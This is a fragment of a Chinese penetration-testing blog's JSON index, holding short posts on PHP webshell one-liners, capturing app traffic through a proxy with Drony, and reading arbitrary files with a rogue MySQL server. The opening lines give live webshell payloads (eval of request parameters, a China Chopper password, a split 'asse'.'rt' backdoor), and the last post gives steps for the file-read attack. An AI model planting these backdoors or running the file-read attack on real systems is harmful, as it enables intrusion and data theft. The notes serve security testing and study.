#命令执行：http://localhost/123.php?1=1+1&amp;2=eval($_GET[cmd])&amp;cmd=system(whoami); #菜刀连接：http://localhost/123.php?1=1+1&amp;2=eval($_POST[cmd]) 密码：cmd usort($_GET,&apos;asse&apos;.&apos;rt&apos;);","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"笔记","slug":"笔记","permalink":"https://yejinpoxiao.xyz/tags/%E7%AC%94%E8%AE%B0/"}]},{"title":"使用drony解决APP无法抓包","slug":"使用drony解决APP无法抓包","date":"2019-12-18T06:58:30.602Z","updated":"2020-06-08T06:46:20.705Z","comments":true,"path":"2019/12/18/使用drony解决APP无法抓包/","link":"","permalink":"https://yejinpoxiao.xyz/2019/12/18/%E4%BD%BF%E7%94%A8drony%E8%A7%A3%E5%86%B3APP%E6%97%A0%E6%B3%95%E6%8A%93%E5%8C%85/","excerpt":"","text":"原因默认Flutter不会主动使用系统代理，需要单独设置。 解决方案使用抓包工具（Fiddler、burp等都可）抓包，模拟器安装drony抓包前设置指定代理。 环境常规配置：1.抓包工具安装，证书安装；2.安卓模拟器安装，并安装drony3.drony配置(这里试验抓闲鱼的数据包):进入drony,此时是off关闭状态， 向左划动，选择Wi-Fi 对wi-fi进行设置 选择代理模式为手动（Manual） Proxy type代理方式选择 Plain http proxy ，Filter default value 选择 Direct all 选择Rule，设置应用规则 ) Network id处 选择当前wifi的SSID，Action 选择 Local proxy chain， Application 选择需要强制代理的APP，Hostname 及 Port 不填，表示所有的都会被强制代理。 返回到主页面，点击off，变为启动状态 4.抓包工具配置：设置代理ip及端口 后续进行抓包常规操作即可","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"测试姿势","slug":"测试姿势","permalink":"https://yejinpoxiao.xyz/tags/%E6%B5%8B%E8%AF%95%E5%A7%BF%E5%8A%BF/"}]},{"title":"伪造mysql服务端实现任意文件读取","slug":"伪造mysql服务端实现任意文件读取","date":"2019-12-13T09:40:29.302Z","updated":"2020-06-04T10:03:45.769Z","comments":true,"path":"2019/12/13/伪造mysql服务端实现任意文件读取/","link":"","permalink":"https://yejinpoxiao.xyz/2019/12/13/%E4%BC%AA%E9%80%A0mysql%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%AE%9E%E7%8E%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/","excerpt":"","text":"研究情况： 当遇到可控MYSQL时怎么进一步搞事情 情景：1.遇到弱口令的phpmyadmin、adminer等可以免登录管控mysql 2.注入高权限，可--os-shell （可以上传另说，出现上传失败的情况可以利用） 3.。。。。。其他情况 所需环境：虚拟机两个，靶机装mysql，攻击端装py工具：https://github.com/YGnight/Mysqlist 工具介绍：exp_input.py脚本是输入文件，单独读取 启动 1python2 exp_input.py port （port为端口号，3306都可） 读取的文件最后保存在log文件夹下 复现：攻击端运行攻击脚本， exp_input.py 3306 输入要读取的文件（加上物理路径），我们测试读取C:/windows/win.ini 靶机使用mysql向攻击端发送请求 password随便输就行（具体为何随便输就可以去了解原理就懂，这篇文章不讲原理，只做复现笔记） 此时返回攻击端，可以看到dos窗口回显了信息 查看log文件夹，创建了一个靶机的ip文件夹，得到要读取的文件","categories":[{"name":"渗透测试","slug":"渗透测试","permalink":"https://yejinpoxiao.xyz/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"tags":[{"name":"漏洞利用","slug":"漏洞利用","permalink":"https://yejinpoxiao.xyz/tags/%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"}]}]}